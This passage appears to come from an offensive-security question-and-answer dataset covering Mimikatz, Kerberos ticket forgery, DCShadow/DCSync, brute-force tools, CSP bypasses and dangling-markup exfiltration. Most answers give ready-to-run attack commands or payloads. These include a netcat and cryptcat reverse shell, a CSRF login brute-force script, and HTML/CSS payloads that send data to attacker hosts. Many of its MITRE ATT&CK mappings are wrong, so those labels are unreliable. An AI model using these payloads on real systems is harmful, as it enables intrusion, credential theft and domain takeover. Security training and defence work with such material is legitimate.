A: The experimental `event::drop` command is designed to modify the Event Logging Service's behavior, effectively preventing it from recording new events. The full command is: `mimikatz "privilege::debug" "event::drop" exit` MITRE References: MITRE ID is T1562, MITRE Name is: Impair Defenses, and MITRE Tactics are: TA0005.

## Q: How do you create a Golden Ticket using Mimikatz?
A: The `kerberos::golden` command allows creating a Golden Ticket for domain-wide access impersonation. Key parameters include: `/domain`, `/sid`, `/user`, `/krbtgt`, `/ptt` (inject ticket into memory), and `/ticket` (save ticket for later use). Example: `mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit` MITRE References: MITRE ID is T1550, MITRE Name is: Use Alternate Authentication Material, and MITRE Tactics are: TA0006.

## Q: How do you create a Silver Ticket using Mimikatz?
A: The `kerberos::golden` command can also be used to create a Silver Ticket, which grants access to specific services. Key parameters include: `/service` (the target service, e.g., cifs, http), and other parameters similar to the Golden Ticket. Example: `mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit` MITRE References: MITRE ID is T1550, MITRE Name is: Use Alternate Authentication Material, and MITRE Tactics are: TA0006.

## Q: How do you extract credentials from the Local Security Authority (LSA) using Mimikatz?
A: The `lsadump::lsa /inject` command can be used to extract credentials from the LSA. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: TA0006.

## Q: How do you impersonate tokens using Mimikatz?
A: The `token::elevate /domainadmin` command can be used to impersonate tokens. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: TA0004.

## Q: How do you extract passwords from the Windows Vault using Mimikatz?
A: The `vault::cred /patch` command can be used to extract passwords from the Windows Vault. MITRE References: MITRE ID is T1555, MITRE Name is: Credentials from Password Stores, and MITRE Tactics are: TA0006.

## Q: How can you extract the credentials stored in WDigest using Mimikatz?
A: You can use the `sekurlsa::wdigest` command in Mimikatz to extract the plaintext passwords stored in LSASS due to the WDigest protocol being enabled by default on Windows XP through Windows 8.0 and Windows Server 2003 to Windows Server 2012. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: TA0006.

## Q: How can you bypass the enhanced LSA protection using Mimikatz?
A: You can bypass the enhanced LSA protection using the Mimikatz driver `mimidrv.sys`. MITRE References: MITRE ID is T1542, MITRE Name is: Code Signing, and MITRE Tactics are: TA0005.

## Q: How can CRLF Injection be used to enable CORS and bypass the Same-Origin Policy (SOP)?
A: An attacker can inject HTTP headers to enable CORS (Cross-Origin Resource Sharing), bypassing the restrictions imposed by SOP. This breach allows scripts from malicious origins to interact with resources from a different origin, potentially accessing protected data. MITRE References: MITRE ID is T1600, MITRE Name is: Modify Web Logic, and MITRE Tactics are: TA0003, TA0007.

## Q: How can Header Injection be used to enable Request Smuggling?
A: You can inject essential headers to ensure the back-end keeps the connection open after responding to the initial request. This can lead to scenarios typically involving [HTTP request smuggling](/pentesting-web/http-request-smuggling), a technique where extra headers or body elements appended by the server post-injection can lead to various security exploits. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0001, TA0011.

## Q: How can Memcache Injection be used to steal cleartext credentials?
A: If a platform is taking data from an HTTP request and using it without sanitizing it to perform requests to a memcache server, an attacker could abuse this behaviour to inject new memcache commands. This could be used to poison the cache to send the victim's details (usernames and passwords included) to the attacker's servers. MITRE References: MITRE ID is T1558, MITRE Name is: Steal or Forge Kerberos Tickets, and MITRE Tactics are: TA0006.

## Q: How can you use Crowbar to brute force SSH private key authentication?
A: To brute force SSH private key authentication using Crowbar, you can use the following command:

```console
root@kali:~# crowbar -b sshkey -s 192.168.86.61/32 -k /path/to/keys/ -t 10
```

This will use Crowbar version 0.3.5-dev to brute force SSH private key authentication against the host at 192.168.86.61, using all the private keys in the /path/to/keys/ directory, with a timeout of 10 seconds per thread.

This technique can be useful during penetration testing or CTF events to attempt to gain access to SSH servers by leveraging previously obtained private keys. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can you use Crowbar to brute force RDP connections with Network Level Authentication (NLA) support?
A: To brute force RDP connections with NLA support using Crowbar, you can use the following command:

```console
root@kali:~# crowbar -b rdp -s 192.168.86.61/32 -u victim -C /root/words.txt -n 1
```

This will use Crowbar version 0.3.5-dev to brute force RDP connections with NLA support against the host at 192.168.86.61, using the username "victim" and the password list in /root/words.txt, using 1 thread.

This technique can be useful during penetration testing or CTF events to attempt to gain access to RDP servers by trying different username and password combinations. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can you use Crowbar to brute force OpenVPN connections?
A: To brute force OpenVPN connections using Crowbar, you can use the following command:

```consoleroot@kali:~# crowbar -b openvpn -s 192.168.86.61/32 -u victim -C /root/words.txt -m /path/to/openvpn/config.ovpn -n 1```This will use Crowbar version 0.3.5-dev to brute force OpenVPN connections against the host at 192.168.86.61, using the username "victim" and the password list in /root/words.txt, with the OpenVPN configuration file at /path/to/openvpn/config.ovpn, using 1 thread.This technique can be useful during penetration testing or CTF events to attempt to gain access to OpenVPN servers by trying different username and password combinations. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can you use cryptcat to establish a reverse shell?
A: To establish a reverse shell with cryptcat, you can use the following steps:

1. On the attacker machine, start cryptcat in listen mode (`-l`) on port 4444 (`-p 4444`) without name resolution (`-n`) and spawn a shell (`-e /bin/sh`):

```console
root@kali:~# cryptcat -l -p 4444 -n -e /bin/sh
```

2. On the target machine, connect back to the attacker's IP address (`192.168.1.101`) on port 4444:

```consoleroot@target:~# cryptcat 192.168.1.101 4444
```

This will establish a reverse shell from the target machine to the attacker machine, allowing the attacker to execute commands on the target system.

Note: This technique can be used for post-exploitation and lateral movement, which should only be performed on systems you have explicit permission to access. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution, Lateral Movement.

## Q: What are some online databases for cracking hashes?
A: Some online databases for cracking hashes include:

- Google search
- http://hashtoolkit.com/
- https://www.onlinehashcrack.com/
- https://crackstation.net/
- https://md5decrypt.net/
- https://www.onlinehashcrack.com
- https://gpuhash.me/
- https://hashes.org/search.php
- https://www.cmd5.org/
- https://hashkiller.co.uk/Cracker/MD5
- https://www.md5online.org/md5-decrypt.html MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: nan.

## Q: What tools can be used to brute-force OpenSSL encrypted data?
A: Tools that can be used to brute-force OpenSSL encrypted data include:

- https://github.com/glv2/bruteforce-salted-openssl
- https://github.com/carlospolop/easy_BFopensslCTF MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you bypass Content Security Policy (CSP) using self + 'unsafe-inline' with Iframes?
A: To bypass CSP using self + 'unsafe-inline' with iframes, you can follow these steps:1. Create an iframe and set its src to a file, such as '/css/bootstrap.min.css', that is allowed by the CSP policy.2. Once the iframe is loaded, create a script element and set its src to a malicious JavaScript file hosted on a different domain, such as '//example.com/csp.js'.3. Append the script element to the iframe's document head, which will allow the execution of the malicious JavaScript code within the context of the iframe.Example code:```frame=document.createElement("iframe");frame.src="/css/bootstrap.min.css";document.body.appendChild(frame);script=document.createElement('script');script.src='//example.com/csp.js';window.frames[0].document.head.appendChild(script);```This technique works because the CSP policy typically allows the loading of resources from the same origin ('self'), and the 'unsafe-inline' directive allows the execution of inline JavaScript. By loading a file that is allowed by the CSP policy within an iframe, you can then execute arbitrary JavaScript from a different domain within the context of that iframe. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0007, TA0001.

## Q: How can you bypass CSP using errors and error responses?
A: To bypass CSP using errors and error responses, you can follow these steps:1. Induce an error, such as by using an invalid URL or excessive cookies, to trigger an error response from the server.2. Load the error response within an iframe, as error responses typically come without CSP headers and may not include X-Frame-Options.3. Once the iframe is loaded, you can execute arbitrary JavaScript within the context of the iframe.Example code:```// Inducing an nginx errorframe=document.createElement("iframe");frame.src="/%2e%2e%2f";document.body.appendChild(frame);// Triggering an error with a long URLframe=document.createElement("iframe");frame.src="/"+("A").repeat(20000);document.body.appendChild(frame);// Generating an error via extensive cookiesfor(var i=0;i<5;i++){document.cookie=i+"="+("a").repeat(4000)};frame=document.createElement("iframe");frame.src="/";document.body.appendChild(frame);// Removal of cookies is crucial post-executionfor(var i=0;i<5;i++){document.cookie=i+"="}```After triggering any of the mentioned scenarios, you can execute JavaScript within the iframe as follows:```script=document.createElement('script');script.src='//example.com/csp.js';window.frames[0].document.head.appendChild(script);```This technique works because error responses often lack proper CSP headers and X-Frame-Options, allowing you to execute arbitrary JavaScript within the context of the iframe. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0007, TA0001.

## Q: How can you bypass CSRF token defenses?
A: There are several ways to bypass CSRF token defenses:

### From POST to GET
Check if a GET request is also valid and if the CSRF token is still being validated when the token is absent.

### CSRF token is not tied to the user session
Applications not tying CSRF tokens to user sessions present a security risk, as attackers can obtain a valid CSRF token from the global pool and use it in a CSRF attack against a victim.

### Method bypass
If the request is using a "weird" method, check if the method override functionality is working. For example, if it's using a PUT method you can try to use a POST method and send: `https://example.com/my/dear/api/val/num?_method=PUT`

### Custom header token bypass
If the request is adding a custom header with a token, test the request without the Customized Token and also the header. MITRE References: MITRE ID is T1046, MITRE Name is: Network Service Scanning, and MITRE Tactics are: Discovery.

## Q: How can you exfiltrate a CSRF token?
A: If a **CSRF token** is being used as **defence**, you could try to **exfiltrate it** abusing a [**XSS**](/pentesting-web/xss-cross-site-scripting#xss-stealing-csrf-tokens) vulnerability or a [**Dangling Markup**](/pentesting-web/dangling-markup-html-scriptless-injection) vulnerability. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you perform a CSRF login brute force attack?
A: The code can be used to Brut Force a login form using a CSRF token (It's also using the header X-Forwarded-For to try to bypass a possible IP blacklisting):

```pythonimport requestimport reimport randomURL = "http://10.10.10.191/admin/"PROXY = { "http": "127.0.0.1:8080"}SESSION_COOKIE_NAME = "BLUDIT-KEY"USER = "fergus"PASS_LIST="./words"def init_session():    #Return CSRF + Session (cookie)    r = requests.get(URL)    csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)    csrf = csrf.group(1)    session_cookie = r.cookies.get(SESSION_COOKIE_NAME)    return csrf, session_cookiedef login(user, password):    print(f"{user}:{password}")    csrf, cookie = init_session()    cookies = {SESSION_COOKIE_NAME: cookie}    data = {        "tokenCSRF": csrf,        "username": user,        "password": password,        "save": ""    }    headers = {        "X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"    }    r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)    if "Username or password incorrect" in r.text:        return False    else:        print(f"FOUND {user} : {password}")        return Truewith open(PASS_LIST, "r") as f:    for line in f:        login(USER, line.strip())``` MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you use the `:has` and `:not` selectors to exfiltrate information from blind elements?
A: By combining the `:has` and `:not` selectors, it is possible to identify content even from blind elements. This is useful when you have no idea what is inside the web page loading the CSS injection. An example would be `html:has(input[name^="m"]):not(input[name="mytoken"]) { background:url(/m); }`. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0004, TA0002.

## Q: How can you use the `unicode-range` property in `@font-face` to exfiltrate information?
A: By defining custom fonts with specific `unicode-range` values, you can target the fetching of those fonts to exfiltrate information. For example, `@font-face { font-family: poc; src: url(http://attacker.com/?leak); unicode-range:U+0041; }` would fetch the resource `http://attacker.com/?leak` if the text contains the character 'A'. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0004, TA0002.

## Q: How can you use hidden elements and font size changes to leak the charset of a text node?
A: By making specific characters bigger than others using font size changes, you can hide something like a button or an image that won't be loaded. By measuring the action (or lack of the action), you can know if a specific character is present inside the text, effectively leaking the charset. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0004, TA0002.

## Q: How can you use cache timing to leak the charset of a text node?
A: By loading fake fonts from the same origin when a match occurs, you can measure the time it takes and find out if a character appears or not. If there is a font match, multiple requests will be sent to retrieve the font, causing the network to have continuous activity, which can be detected by the longer response time. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0004, TA0002.

## Q: How can you use the timing of loading hundreds of local "fonts" to leak the charset of a text node?
A: By indicating CSS to load hundreds of fake fonts from the same origin when a match occurs, you can measure the time it takes and find out if a character appears or not. If the font does not match, the response time when visiting the bot is expected to be approximately 30 seconds. However, if there is a font match, multiple requests will be sent, causing a longer response time, which can be used as an indicator to determine if there is a font match. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0004, TA0002.

## Q: How can I use cupid-hostapd to setup a fake wireless network and exploit the heartbleed vulnerability?
A: The cupid-hostapd binary has been patched to exploit the heartbleed vulnerability over EAP TLS tunneled protocols like EAP-PEAP, EAP-TLS, and EAP-TTLS. To setup a fake wireless network and exploit the vulnerability, you can run the following command with cupid-hostapd v2.1:

```
root@kali:~# cupid-hostapd --help
cupid-hostapd: invalid option -- '-'
hostapd v2.1
User space daemon for IEEE 802.11 AP management,
IEEE 802.1X/WPA/WPA2/EAP/RADIUS Authenticator
```

This will start the cupid-hostapd service and allow you to exploit the heartbleed vulnerability on wireless access points that use the vulnerable EAP protocols. MITRE References: MITRE ID is T1556, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: TA0006.

## Q: How can I use cupid-wpasupplicant to exploit the heartbleed vulnerability on wireless access points?
A: The cupid-wpasupplicant binary has been patched to exploit the heartbleed vulnerability over EAP TLS tunneled protocols like EAP-PEAP, EAP-TLS, and EAP-TTLS. To attempt to exploit the vulnerability on wireless access points, you can run the following command with cupid-wpasupplicant v2.1:

```
root@kali:~# cupid-wpa_cli -h
wpa_cli [-p<path to ctrl sockets>] [-i<ifname>] [-hvB] [-a<action file>] 
        [-P<pid file>] [-g<global ctrl>] [-G<ping interval>]  [command..]
```

This will start the cupid-wpa_cli utility and allow you to interact with the patched wpa_supplicant to try and exploit the heartbleed vulnerability on wireless access points. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: TA0006.

## Q: How can you use the `mimilib.dll` binary provided by Mimikatz to capture credentials in clear text?
A: You can use the `mimilib.dll` binary provided by Mimikatz to log all credentials in clear text to the `C:\Windows\System32\kiwissp.log` file. To do this, drop the `mimilib.dll` file in `C:\Windows\System32\`, then add `mimilib.dll` to the Security Support Provider list (Security Packages) by running the following command:

```
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```

After a reboot, all credentials used to access the machine will be logged in clear text in the `kiwissp.log` file. MITRE References: MITRE ID is T1547.001, MITRE Name is: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can you inject the `mimilib.dll` into memory directly using Mimikatz to capture credentials?
A: You can inject the `mimilib.dll` into memory directly using Mimikatz with the following commands:

```
privilege::debug
misc::memssp
```

This will log all credentials in clear text, but it won't survive reboots. MITRE References: MITRE ID is T1547.001, MITRE Name is: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can Cymothoa be used to perform a stealthy backdoor attack?
A: Cymothoa is a tool that can inject malicious shellcode into an existing process, allowing for a stealthy backdoor attack. The tool uses the ptrace library to manipulate processes and infect them. To use Cymothoa, run the command 'cymothoa -p <pid> -s <shellcode_number>' where <pid> is the process ID to infect and <shellcode_number> is the number of the shellcode to inject. Cymothoa version 1 (beta) supports various options to control the injection process, such as forking the parent process, creating a payload thread, and scheduling the payload execution. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Persistence, Privilege Escalation.

## Q: How can you steal clear text secrets using Dangling Markup?
A: You can inject an `<img src='http://evil.com/log.cgi?` tag when the page is loaded. The victim will then send you all the code between the injected `img` tag and the next quote inside the code. If a secret is somehow located in that chunk, you will steal it. If the `img` tag is forbidden (due to CSP for example) you can also use `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`.

You can also abuse CSS `@import` (will send all the code until it finds a ";"), use `<table background='//your-collaborator-id.burpcollaborator.net?'`, insert a `<base` tag (will send information until the quote is closed), or use a hidden `<input type='hidden' name='review_body' value="` field to capture data. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0004 - Defense Evasion, TA0005 - Privilege Escalation.

## Q: How can you steal forms using Dangling Markup?
A: You can use a `<base href='http://evil.com/'>` tag to change the domain that forms submit to. You can also directly overwrite the `<form action='http://evil.com/log_steal'>` to send the form data to the attacker's domain. Additionally, you can change the `formaction` attribute of a `<button>` to alter where the form data is submitted. MITRE References: MITRE ID is T1189, MITRE Name is: Indicator Removal on Host, and MITRE Tactics are: TA0005 - Privilege Escalation, TA0009 - Collection.

## Q: How can you bypass Content Security Policy (CSP) using Dangling Markup?
A: Even in the most CSP restricted environments, you can still exfiltrate data with some user interaction. You can inject a link like `<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a><base target='` that will redirect the user to a page controlled by you. This will allow you to access the `window.name` and exfiltrate the data. MITRE References: MITRE ID is T1132, MITRE Name is: Data Encoding, and MITRE Tactics are: TA0009 - Collection.

## Q: How can you abuse iframes using Dangling Markup?
A: A child document possesses the capability to view and modify the `location` property of its parent, even in cross-origin situations. This allows the embedding of a script within an **iframe** that can redirect the client to an arbitrary page, like `<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>`.

You can also abuse the iframe `name` attribute to leak sensitive information from a different page. This is done by creating an iframe that iframes itself, making the sensitive info appear inside the iframe `name` attribute, which can then be accessed and leaked. MITRE References: MITRE ID is T1021, MITRE Name is: Remote Services, and MITRE Tactics are: TA0008 - Lateral Movement.

## Q: How can you abuse the `<meta>` tag using Dangling Markup?
A: You could use `**meta http-equiv**` to perform **several actions** like setting a Cookie: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` or performing a redirect (in 5s in this case): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`.

This can be **avoided** with a **CSP** regarding **http-equiv** ( `Content-Security-Policy: default-src 'self';`, or `Content-Security-Policy: http-equiv 'self';`). MITRE References: MITRE ID is T1185, MITRE Name is: User Account Discovery, and MITRE Tactics are: TA0007 - Discovery.

## Q: How can darkstat be used to capture network traffic on a target system?
A: Darkstat can be used to capture and analyze network traffic on a target system. To use darkstat, run the following command as root: `darkstat -i <interface>`. This will start the darkstat process and begin capturing traffic on the specified network interface. The captured data can be viewed in a web browser by navigating to `http://<host>:667/`. Darkstat provides detailed statistics on the captured traffic, including IP addresses, ports, protocols, and bandwidth usage. MITRE References: MITRE ID is T1040, MITRE Name is: Network Sniffing, and MITRE Tactics are: Reconnaissance.

## Q: How can DBeaver be used to perform SQL injection attacks on databases?
A: DBeaver can be used to execute SQL commands on databases, which could potentially be leveraged to perform SQL injection attacks. To do this, simply open a connection to the target database in DBeaver, navigate to the SQL Editor, and craft malicious SQL queries to test for vulnerabilities. The version used in this example is DBeaver 23.3.5. MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: Reconnaissance.

## Q: How can DBeaver be used to maintain persistent access to a compromised database?
A: DBeaver can potentially be used to maintain access to a compromised database by creating malicious user accounts or modifying existing ones with elevated privileges. This could allow the attacker to regain access to the database even after the initial compromise has been detected and resolved. The version used in this example is DBeaver 23.3.5. MITRE References: MITRE ID is T1136, MITRE Name is: Create Account, and MITRE Tactics are: Persistence.

## Q: How can data be exfiltrated using the `lo_import` and `dblink_connect` commands in PostgreSQL?
A: To exfiltrate data using `lo_import` and `dblink_connect` in PostgreSQL:1. Use `lo_import` to load a file into the database's large object storage.2. Then, use `dblink_connect` to establish a connection to a remote server.3. Finally, use `dblink_lo_export` to export the large object from the local database to the remote server, effectively exfiltrating the data. MITRE References: MITRE ID is T1048, MITRE Name is: Exfiltration Over Alternative Protocol, and MITRE Tactics are: Exfiltration.

## Q: What are some tools that can be used to automate lateral movement using DCOM objects?
A: Two tools that can be used to automate lateral movement using DCOM objects are Invoke-DCOM.ps1, a PowerShell script provided by the Empire project, and SharpLateral, a tool designed for executing code remotely. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How do you perform the DCShadow attack?
A: To perform the attack you need 2 mimikatz instances. One of them will start the RPC servers with SYSTEM privileges (you have to indicate here the changes you want to perform), and the other instance will be used to push the values:

mimikatz1 (RPC servers)
```
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
mimikatz2 (push) - Needs DA or similar
```
lsadump::dcshadow /push
```
Notice that `elevate::token` won't work in `mimikatz1` session as that elevated the privileges of the thread, but we need to elevate the privilege of the process. MITRE References: MITRE ID is T1207, MITRE Name is: Rogue Domain Controller, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can you use DCShadow to create backdoors?
A: Some ways to use DCShadow to create backdoors include:

- Set Enterprise Admins in SIDHistory to a user:
    ```
    lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
    ```
- Change PrimaryGroupID (put user as member of Domain Administrators):
    ```
    lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
    ```
- Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user):
    ```
    #First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
    (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl
    #Second, add to the ACE permissions to your user and push it using DCShadow
    lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
    ``` MITRE References: MITRE ID is T1207, MITRE Name is: Rogue Domain Controller, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can you use DCShadow to give yourself DCShadow permissions without leaving modified permissions logs?
A: To give yourself DCShadow permissions using DCShadow (without leaving modified permissions logs), you need to append the following ACEs with your user's SID at the end:

- On the domain object:
    - `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
    - `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
    - `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- On the attacker computer object: `(A;;WP;;;UserSID)`
- On the target user object: `(A;;WP;;;UserSID)`
- On the Sites object in Configuration container: `(A;CI;CCDC;;;UserSID)`

In the mimikatz1 session (RPC server), use the parameter `/stack` with each change you want to make. Then, in the mimikatz2 session, use `/push` to perform all the changes in the rogue server. MITRE References: MITRE ID is T1207, MITRE Name is: Rogue Domain Controller, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can you exploit the DCSync attack locally using Mimikatz?
A: You can exploit the DCSync attack locally using Mimikatz with the following command:

```
Invoke-Mimikatz -Command ""lsadump::dcsync /user:dcorp\krbtgt""
``` MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: TA0006.

## Q: How can you exploit the DCSync attack remotely using the secretsdump.py tool?
A: You can exploit the DCSync attack remotely using the secretsdump.py tool with the following command:

```
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```

This will generate 3 files:
* one with the **NTLM hashes**
* one with the the **Kerberos keys**
* one with cleartext passwords from the NTDS for any accounts set with [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) enabled. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: TA0006.

## Q: How can de4dot v3.1.41592.3405 be used to bypass anti-debugging and anti-dump protections in obfuscated .NET binaries?
A: de4dot has options to remove anti-debugging and anti-dump protection code that is commonly added by .NET obfuscators. This can be useful for further reverse engineering and analysis of the binary.

To remove Confuser's anti-debug and anti-dump protections, run de4dot with the following options:de4dot.exe -f obfuscated.dll -p cr --cr-antidb --cr-antidumpThis will deobfuscate the assembly and strip out the anti-debugging and anti-dump mechanisms added by the Confuser obfuscator. Similar options are available for other obfuscator types like Crypto Obfuscator and SmartAssembly. MITRE References: MITRE ID is T1112, MITRE Name is: Modify Registry, and MITRE Tactics are: Defense Evasion.

## Q: How can you exploit deserialization vulnerabilities in .NET applications?
A: In .NET, deserialization exploits operate similar to Java, where gadgets are exploited to run specific code during the deserialization of an object. The tool ysoserial.net can be used to generate payloads that exploit known .NET deserialization vulnerabilities. Mitigation strategies include avoiding allowing data streams to define their object types, setting `TypeNameHandling` to `None` for JSON.NET, and implementing whitelist controls using a custom `SerializationBinder`. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can the dhcpig tool be used to perform a DHCP exhaustion attack, and what are some of the options available to customize the attack?
A: To perform a DHCP exhaustion attack using dhcpig, you can run the following command: `pig.py <interface>`. This will send DHCPDISCOVER requests to exhaust all available IP addresses on the specified network interface. Some of the key options available to customize the attack include:- `-s, --client-src`: Specify a list of client MAC addresses to use- `-O, --request-options`: Select specific DHCP options to request- `-f, --fuzz`: Randomly fuzz the DHCP packets- `-t, --threads`: Set the number of sending threads- `-g, --neighbors-attack-garp`: Knock off network hosts using gratuitous ARP- `-r, --neighbors-attack-release`: Release all neighboring IP addresses MITRE References: MITRE ID is T1489, MITRE Name is: Service Stop, and MITRE Tactics are: Impact.

## Q: How can a diamond ticket be used to gain access as any user?
A: A diamond ticket is made by modifying the fields of a legitimate TGT that was issued by a DC. This is achieved by requesting a TGT, decrypting it with the domain's krbtgt hash, modifying the desired fields of the ticket, then re-encrypting it. This overcomes the shortcomings of a golden ticket because the TGS-REQs will have a preceding AS-REQ and the TGT was issued by a DC which means it will have all the correct details from the domain's Kerberos policy. MITRE References: MITRE ID is T1558.003, MITRE Name is: Steal or Forge Kerberos Tickets, and MITRE Tactics are: PrivilegeEscalation, InitialAccess, Persistence.

## Q: How can dirb be used to enumerate directories on a web server?
A: Dirb version 2.22+dfsg-5 can be used to scan a web server for directory listings. The command "dirb http://192.168.1.224/ /usr/share/wordlists/dirb/common.txt" will scan the server at "http://192.168.1.224/" using the common.txt wordlist to look for existing directories. The output will show any discovered directories like ".svn/", "cgi-bin/", "config/", "docs/", and "external/". MITRE References: MITRE ID is T1592, MITRE Name is: Gather Victim Host Information, and MITRE Tactics are: Discovery.

## Q: How can you bypass disable_functions in mod_cgi?
A: You can bypass disable_functions in mod_cgi by:1. Ensuring mod_cgi is enabled2. Ensuring the current directory is writable3. Ensuring .htaccess files are enabled4. Appending 'Options +ExecCGI
AddHandler cgi-script .dizzle' to the .htaccess file5. Creating a shell script file 'shell.dizzle' with the desired command to execute (e.g. 'nc -c '/bin/bash' 172.16.15.1 4444')6. Chmoding the 'shell.dizzle' file to 777 (rwx) permissions7. Accessing the 'shell.dizzle' script to execute the command MITRE References: MITRE ID is T1559.001, MITRE Name is: Hijack Execution Flow: Launchd, and MITRE Tactics are: Execution.

## Q: How can you bypass the disable_functions restriction in PHP?
A: You can bypass the disable_functions restriction in PHP by using the pcntl_exec() function, which allows you to execute external commands. The example code provided first sets up a directory and command, then uses pcntl_exec() to run the command. This can be extended to execute arbitrary commands by passing them as arguments to pcntl_exec(). MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can PHP cURL be used to bypass the 'disable_functions' restriction in PHP versions 5.2.4 and 5.2.5?
A: To bypass the 'disable_functions' restriction in PHP versions 5.2.4 and 5.2.5 using PHP cURL, you can use the following code:

```
var_dump(curl_exec(curl_init("file://safe_mode_bypass\x00&quot;.__FILE__)));
```
This exploit abuses a vulnerability in the PHP cURL library to gain access to restricted files, potentially obtaining sensitive information. MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: Privilege Escalation.

## Q: How to bypass disable_functions in PHP 5.2 using the fopen() exploit?
A: To bypass the `disable_functions` in PHP 5.2 using the `fopen()` exploit, you can run the following command:

```phpphp -r 'fopen("srpath://../../../../../../../dir/pliczek", "a");'```
This command will create a file named `pliczek` in the `dir` directory. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you use the `FuckFastGCI` tool to bypass `disable_functions` and `open_basedir`?
